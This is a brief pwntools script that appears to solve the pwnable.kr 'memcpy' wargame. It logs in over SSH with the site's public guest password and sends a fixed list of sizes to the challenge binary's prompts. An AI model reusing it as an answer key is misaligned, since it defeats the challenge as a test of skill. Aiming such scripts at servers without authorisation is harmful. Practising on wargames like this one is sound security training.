from pwn import *
import sys


if len(sys.argv) > 1 and sys.argv[1] == "remote":
    proc = ssh("memcpy", "pwnable.kr", password="guest", port=2222)
    p = proc.process("nc localhost 9022", shell=True)
else: 
    p= process("./memcpy_32")

print p.recvuntil("16 :")
p.sendline("8")

print p.recvuntil("32 :")
p.sendline("16")

print p.recvuntil("64 :")
p.sendline("32")

print p.recvuntil("128 :")
p.sendline("72")

print p.recvuntil("256 :")
p.sendline("136")

print p.recvuntil("512 :")
p.sendline("264")

print p.recvuntil("1024 :")
p.sendline("520")

print p.recvuntil("2048 :")
p.sendline("1032")

print p.recvuntil("4096 :")
p.sendline("2056")

print p.recvuntil("8192 :")
p.sendline("4104")

print p.recvall()
